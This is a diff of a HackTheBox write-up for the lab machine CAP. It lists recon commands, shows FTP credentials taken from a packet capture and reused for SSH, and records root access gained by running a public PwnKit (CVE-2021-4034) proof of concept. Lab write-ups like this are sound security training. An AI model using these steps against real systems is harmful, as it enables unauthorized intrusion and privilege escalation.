@@ -1,105 +1,131 @@
-# CAP - HackTheBox Writeup (2025-04-07)
+
+# 💥 CAP - HackTheBox Writeup
 
 > ⚠️ **Disclaimer**
 >
 > This report documents a security assessment performed on a publicly available vulnerable machine within the HackTheBox platform.
 > All activities were conducted legally and within the authorized scope of HackTheBox Labs.
 >
-> This report is shared strictly for educational and ethical purposes only.
+> This content is intended strictly for educational and ethical purposes only.
 
-
-## Target Overview
-
-- **Machine Name:** CAP
-- **IP Address:** 10.10.10.245
+## 📌 Target Info
+- **IP:** 10.10.10.245
 - **Platform:** HackTheBox
 - **Difficulty:** Easy
-- **Objective:** Gain root access and capture flags
+- **Method:** VPN-based access to HTB network
 
+---
 
-## Enumeration
+## 🧭 Enumeration
 
-### 🔎 Nmap Scan
+### 🔍 Nmap Scan
+
+**Command:**
 ```bash
 nmap -sC -sV -p- -oN cap_nmap.txt 10.10.10.245
 ```
 
-**Open Ports:**
+**Key Findings:**
+- `21/tcp` — FTP (vsftpd 3.0.3)
+- `22/tcp` — SSH (OpenSSH 8.2p1 Ubuntu)
+- `80/tcp` — HTTP (Gunicorn) with “Security Dashboard” title
+
+### 🌐 Web Discovery
+
+**Manual Inspection & Gobuster:**
+- Found `/data/0`, `/data/3`
+- `/data/3` contained a downloadable `.pcap` file
+
+---
+
+## 💣 Exploitation
+
+### ✅ 1. PCAP Analysis → FTP Creds
+
+**Tool:**
+```bash
+wireshark login.pcap
 ```
-21/tcp open  ftp     vsftpd 3.0.3
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
-80/tcp open  http    Gunicorn
+
+**Extracted Credentials:**
+```
+USER nathan
+PASS Buck3tH4TF0RM3!
 ```
 
-- Port 80 hosted a “Security Dashboard” with limited functionality.
-- Discovered `/data/0` and `/data/3` endpoints via directory fuzzing and manual inspection.
-- Downloaded a `.pcap` file from `/data/3`.
+**Usage:**
+```bash
+ssh nathan@10.10.10.245
+```
 
+**Result:** SSH access as `nathan`.
 
-## Initial Foothold
+**Flag #1:**
+```bash
+cat ~/user.txt
+```
 
-### 📦 Credential Extraction from PCAP
-- Inspected `login.pcap` with Wireshark.
-- Captured a plaintext FTP login:
-  ```
-  USER nathan
-  PASS Buck3tH4TF0RM3!
-  ```
+---
 
-- Credentials worked for **SSH login**:
-  ```bash
-  ssh nathan@10.10.10.245
-  ```
+### ✅ 2. PrivEsc via pkexec (PwnKit)
 
-- Flag #1: User flag located at:
-  ```bash
-  cat ~/user.txt
-  ```
+**Command:**
+```bash
+pkexec --version
+→ 0.105
+```
 
-- Nathan is **not** a sudoer (`sudo -l` returned permission denied).
+**Vulnerability:** CVE-2021-4034 (PwnKit)
 
+**Exploit Used:**
+- GitHub PoC: https://github.com/berdav/CVE-2021-4034
+- Compiled with `make`
+- Uploaded and executed on target
 
-## Privilege Escalation
+**Result:**
+```bash
+./pwnkit
+whoami → root
+```
 
-### 🚀 PrivEsc via CVE-2021-4034 (PwnKit)
-- Found `/usr/bin/pkexec` with SUID bit set.
-- Checked version:
-  ```bash
-  pkexec --version
-  → 0.105
-  ```
+**Flag #2:**
+```bash
+cat /root/root.txt
+```
 
-- Confirmed vulnerable to **PwnKit** exploit.
+---
 
-### ✅ Exploitation Steps:
-- Downloaded PoC exploit from:
-  `https://github.com/berdav/CVE-2021-4034`
-- Compiled the shared object:
-  ```bash
-  make
-  ```
-- Executed exploit:
-  ```bash
-  ./cve-2021-4034
-  whoami → root
-  ```
+## 🔐 Credentials Used
 
-- Flag #2: Root flag located at:
-  ```bash
-  cat /root/root.txt
-  ```
+- SSH: `nathan : Buck3tH4TF0RM3!`
 
+---
 
-## Conclusion
+## 🧠 Lessons Learned
 
-Successfully compromised CAP via:
-- PCAP file analysis and credential reuse
-- Abuse of vulnerable `pkexec` binary (PwnKit)
+- PCAP files can leak credentials — always analyze available data
+- Common misconfigs (e.g. pkexec version) are still present in live targets
+- Privesc requires consistent recon of SUID binaries and versions
 
-**Tools Used:** Nmap, Gobuster, Wireshark, gcc, Git, CVE-2021-4034 exploit
+---
 
-**Lessons Learned:**
-- Traffic captures can leak real credentials.
-- Always verify local binaries with SUID for known vulns.
-- Privilege escalation is often one small misconfig away.
+## 🧰 Tools Used
 
+- `nmap`
+- `gobuster`
+- `wireshark`
+- `ssh`
+- `git`, `make`, `gcc`
+
+---
+
+## ✅ Outcome
+
+The target machine was fully compromised via:
+1. Extracted FTP creds from `.pcap` file → SSH access
+2. Privilege escalation using the PwnKit (CVE-2021-4034) vulnerability
+
+---
+
+**Author:** Esteban BREA HELL  
+**GitHub:** [github.com/EstebanBreaHell](https://github.com/EstebanBreaHell)
